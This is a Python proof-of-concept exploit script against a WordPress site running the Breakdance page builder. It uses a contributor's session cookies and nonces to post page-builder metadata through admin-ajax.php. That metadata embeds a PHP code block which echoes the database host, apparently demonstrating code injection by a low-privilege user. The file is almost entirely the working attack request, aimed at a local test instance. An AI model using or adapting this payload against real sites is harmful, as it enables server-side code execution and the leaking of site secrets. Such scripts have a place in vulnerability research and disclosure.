#!/usr/bin/env python3

import requests

cookies = {
    'wordpress_86a9106ae65537651a8e456835b316ab': 'contributor%7C1715730284%7CYpXQ7ZvLqaUPEttBdr2Fz9UYr0e7fuXXW2aKRFbzsC8%7C4f50e47457611f2c2b1839a9f006a892b85bb67de5d1c3041b3a81f64e227b03',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'PHPSESSID': '5d8cc7d3b5c49a842fc7012ce2c6aaec',
    'breakdance_session_count': '1',
    'breakdance_last_session_id': '5d8cc7d3b5c49a842fc7012ce2c6aaec',
    'phpMyAdmin': '9b09737823ffa815969dafea29d16f8f',
    'pma_lang': 'sv',
    'wp_lang': 'en_US',
    'wordpress_logged_in_86a9106ae65537651a8e456835b316ab': 'contributor%7C1715730284%7CYpXQ7ZvLqaUPEttBdr2Fz9UYr0e7fuXXW2aKRFbzsC8%7Cbf1539cad82ea5f777878d2f899218028f9c4dc1821b9843588c29ed9938209b',
    'breakdance_view_count': '29',
    'wp-settings-time-2': '1715621482',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'wordpress_86a9106ae65537651a8e456835b316ab=contributor%7C1715730284%7CYpXQ7ZvLqaUPEttBdr2Fz9UYr0e7fuXXW2aKRFbzsC8%7C4f50e47457611f2c2b1839a9f006a892b85bb67de5d1c3041b3a81f64e227b03; wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=5d8cc7d3b5c49a842fc7012ce2c6aaec; breakdance_session_count=1; breakdance_last_session_id=5d8cc7d3b5c49a842fc7012ce2c6aaec; phpMyAdmin=9b09737823ffa815969dafea29d16f8f; pma_lang=sv; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=contributor%7C1715730284%7CYpXQ7ZvLqaUPEttBdr2Fz9UYr0e7fuXXW2aKRFbzsC8%7Cbf1539cad82ea5f777878d2f899218028f9c4dc1821b9843588c29ed9938209b; breakdance_view_count=29; wp-settings-time-2=1715621482',
    'Origin': 'http://localhost',
    'Pragma': 'no-cache',
    'Referer': 'http://localhost/wp-admin/post.php?post=26&action=edit',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
}

data = {
    '_ajax_nonce': '1881b84386',
    'action': 'add-meta',
    '_ajax_nonce-add-meta': '2044b37e0c',
    'meta[40][key]': 'breakdance_data',
    'meta[40][value]': '{"tree_json_string":"{\\"root\\":{\\"id\\":1,\\"data\\":{\\"type\\":\\"root\\",\\"properties\\":{}},\\"children\\":[{\\"id\\":100,\\"data\\":{\\"type\\":\\"EssentialElements\\\\\\\\Section\\",\\"properties\\":null},\\"children\\":[{\\"id\\":101,\\"data\\":{\\"type\\":\\"EssentialElements\\\\\\\\CodeBlock\\",\\"properties\\":{\\"content\\":{\\"content\\":{\\"php_code\\":\\"<?php echo DB_HOST; ?>\\"}}}},\\"children\\":[],\\"_parentId\\":100}],\\"_parentId\\":1}]},\\"_nextNodeId\\":102,\\"status\\":\\"exported\\"}"}',
    'post_id': '26',
}

response = requests.post('http://localhost/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

print(response.text)
